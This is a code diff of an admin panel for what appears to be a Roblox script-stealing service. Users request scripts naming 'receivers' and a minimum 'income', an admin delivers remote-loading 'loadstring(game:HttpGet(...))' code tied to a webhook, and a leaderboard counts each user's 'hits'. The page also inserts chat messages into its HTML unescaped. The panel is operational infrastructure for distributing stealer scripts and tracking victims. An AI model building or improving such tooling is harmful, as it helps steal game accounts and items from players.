@@ -10,10 +10,12 @@
         .modal-content { background:var(--bg-sidebar); padding:20px; border-radius:8px; width:450px; border:1px solid var(--accent); }
         textarea { width:100%; height:120px; background:#000; color:var(--success); border:1px solid #333; margin-top:10px; font-family:monospace; }
         
-        /* Style du chat identique au dashboard */
-        .chat-container { display: flex; flex-direction: column; height: 70vh; background: var(--bg-card); border-radius: 8px; overflow: hidden; }
-        #admin-chat-messages { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 10px; }
-        .chat-input-area { display: flex; padding: 15px; background: var(--bg-sidebar); gap: 10px; }
+        /* Style Chat Monitor (Identique Dashboard) */
+        .chat-container { display: flex; flex-direction: column; height: 75vh; background: var(--bg-card); border-radius: 8px; overflow: hidden; border: 1px solid #1a1a1c; }
+        #admin-chat-messages { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 12px; }
+        .chat-input-area { display: flex; padding: 15px; background: var(--bg-sidebar); gap: 10px; border-top: 1px solid #1a1a1c; }
+        .message-bubble { background: #1a1a1c; padding: 10px 15px; border-radius: 10px; width: fit-content; max-width: 80%; }
+        .message-bubble small { display: block; margin-bottom: 4px; font-weight: bold; color: var(--accent); }
     </style>
 </head>
 <body>
@@ -21,7 +23,7 @@
     <div id="admin-lock">
         <div class="auth-card">
             <h2 style="color:var(--accent)">MASTER ACCESS</h2>
-            <input type="password" id="master-input" placeholder="Master Password">
+            <input type="password" id="master-input" placeholder="Enter Master Password">
             <button onclick="verifyMaster()">Unlock Panel</button>
             <p id="lock-error" style="color:var(--danger); margin-top:10px;"></p>
         </div>
@@ -59,8 +61,8 @@
                 <div class="chat-container">
                     <div id="admin-chat-messages"></div>
                     <div class="chat-input-area">
-                        <input type="text" id="admin-chat-input" placeholder="Post as Admin...">
-                        <button onclick="sendAdminChatMessage()" style="width: auto; padding: 0 20px;">Send</button>
+                        <input type="text" id="admin-chat-input" placeholder="Write a message as Admin...">
+                        <button onclick="sendAdminChatMessage()" style="width: auto; padding: 0 25px;">Send</button>
                     </div>
                 </div>
             </div>
@@ -69,13 +71,16 @@
 
     <div id="scriptModal" class="modal">
         <div class="modal-content">
-            <h3>Process Script</h3>
+            <h3>Deliver Script</h3>
             <input type="hidden" id="m-uuid">
-            <input type="text" id="m-rec" placeholder="Receiver Name">
-            <input type="text" id="m-inc" placeholder="Income Level">
-            <textarea id="m-code" placeholder="loadstring(...)"></textarea>
-            <button onclick="deliverScript()" style="margin-top:15px;">DELIVER SCRIPT</button>
-            <button onclick="closeModal()" style="background:transparent; color:gray;">Cancel</button>
+            <label>Receiver Name:</label>
+            <input type="text" id="m-rec">
+            <label>Income Level:</label>
+            <input type="text" id="m-inc">
+            <label>Script Code:</label>
+            <textarea id="m-code" placeholder="loadstring(game:HttpGet(...))()"></textarea>
+            <button onclick="deliverScript()" style="margin-top:15px;">SEND TO USER</button>
+            <button onclick="closeModal()" style="background:transparent; color:gray; margin-top:5px;">Cancel</button>
         </div>
     </div>
 
@@ -97,13 +102,15 @@
                 document.getElementById('admin-content').style.display = 'flex';
                 loadAll();
                 loadChatHistory();
-            } else { document.getElementById('lock-error').innerText = "Access Denied."; }
+            } else { 
+                document.getElementById('lock-error').innerText = "Invalid Password."; 
+            }
         }
 
         async function loadAll() {
             const h = { 'x-admin-key': MASTER_KEY };
             
-            // Users list
+            // Fetch Users
             const uReq = await fetch('/api/admin/users', { headers: h });
             const users = await uReq.json();
             document.getElementById('users-list').innerHTML = users.map(u => `
@@ -116,31 +123,32 @@
                 </div>
             `).join('');
 
-            // Requests
+            // Fetch Requests
             const rReq = await fetch('/api/admin/requests', { headers: h });
             const reqs = await rReq.json();
-            document.getElementById('requests-list').innerHTML = reqs.map(r => `
+            document.getElementById('requests-list').innerHTML = reqs.length ? reqs.map(r => `
                 <div class="hit-card" style="border-left:4px solid var(--accent);">
-                    <strong>${r.username}</strong> Request:<br>
-                    Receivers: <code>${r.receivers}</code> | Min Income: <code>${r.minIncome}</code>
-                    <button onclick="openModal('${r.webhookuuid}', '${r.receivers}', '${r.minIncome}')" style="margin-top:10px;">Deliver Script</button>
+                    <strong>${r.username}</strong> Requesting Script<br>
+                    Target: <code>${r.receivers}</code> | Income: <code>${r.minIncome}</code>
+                    <button onclick="openModal('${r.webhookuuid}', '${r.receivers}', '${r.minIncome}')" style="margin-top:10px;">Process Request</button>
                 </div>
-            `).join('');
+            `).join('') : '<p style="color:gray;">No pending requests.</p>';
 
-            // Leaderboard (C'est ici que les hits s'affichent)
+            // Update Leaderboard
             const sorted = [...users].sort((a,b) => (b.hitsCount || 0) - (a.hitsCount || 0));
             document.getElementById('leaderboard-list').innerHTML = sorted.map((u, i) => `
-                <div style="padding:15px; background:var(--bg-sidebar); margin-bottom:8px; border-radius:5px; display:flex; justify-content:space-between; align-items:center;">
-                    <span>#${i+1} <strong>${u.username}</strong></span>
-                    <span style="color:var(--success); font-weight:bold; font-size:1.2em;">${u.hitsCount || 0} HITS</span>
+                <div style="padding:15px; background:var(--bg-sidebar); margin-bottom:8px; border-radius:5px; display:flex; justify-content:space-between; align-items:center; border: 1px solid #1a1a1c;">
+                    <span><span style="color:var(--accent); font-weight:bold; margin-right:10px;">#${i+1}</span> <strong>${u.username}</strong></span>
+                    <span style="color:var(--success); font-weight:bold; font-size:1.1em;">${u.hitsCount || 0} HITS</span>
                 </div>
             `).join('');
         }
 
-        // --- LOGIQUE CHAT ---
+        // --- CHAT LOGIC ---
         async function loadChatHistory() {
             const res = await fetch('/api/messages');
             const messages = await res.json();
+            document.getElementById('admin-chat-messages').innerHTML = "";
             messages.forEach(appendMessage);
         }
 
@@ -148,27 +156,28 @@
             const container = document.getElementById('admin-chat-messages');
             const div = document.createElement('div');
             div.className = 'message-bubble';
-            div.innerHTML = `<small style="color:var(--accent)">${msg.senderName}</small><div>${msg.content}</div>`;
+            div.innerHTML = `<small>${msg.senderName}</small><div>${msg.content}</div>`;
             container.appendChild(div);
             container.scrollTop = container.scrollHeight;
         }
 
         async function sendAdminChatMessage() {
             const input = document.getElementById('admin-chat-input');
-            if(!input.value) return;
+            if(!input.value.trim()) return;
             await fetch('/api/messages/send', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: "(ADMIN) " + input.value })
+                body: JSON.stringify({ content: "🛡️ (ADMIN): " + input.value })
             });
             input.value = "";
         }
 
+        // --- REAL-TIME LISTENERS ---
         socket.on('new_general_message', appendMessage);
         socket.on('new_script_request', loadAll);
-        socket.on('stats_updated', loadAll); // 🔥 Rafraîchit le leaderboard quand un hit arrive
+        socket.on('stats_updated', loadAll); // Auto-refresh leaderboard
 
-        // Modal fns
+        // --- UI HELPERS ---
         function openModal(uuid, rec='', inc='') {
             document.getElementById('m-uuid').value = uuid;
             document.getElementById('m-rec').value = rec;
@@ -180,7 +189,7 @@
         async function deliverScript() {
             await fetch('/api/scripts/send', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: { 'Content-Type': 'application/json', 'x-admin-key': MASTER_KEY },
                 body: JSON.stringify({
                     webhookuuid: document.getElementById('m-uuid').value,
                     receiver: document.getElementById('m-rec').value,
@@ -193,10 +202,12 @@
         }
 
         async function deleteUser(id) {
-            if(confirm("Supprimer l'utilisateur ?")) {
-                await fetch(`/api/admin/users/${id}`, { method: 'DELETE', headers: { 'x-admin-key': MASTER_KEY } });
-                loadAll();
-            }
+            if(!confirm("Are you sure? This action is permanent.")) return;
+            await fetch(`/api/admin/users/${id}`, { 
+                method: 'DELETE', 
+                headers: { 'x-admin-key': MASTER_KEY } 
+            });
+            loadAll();
         }
 
         function openTab(evt, tabName) {
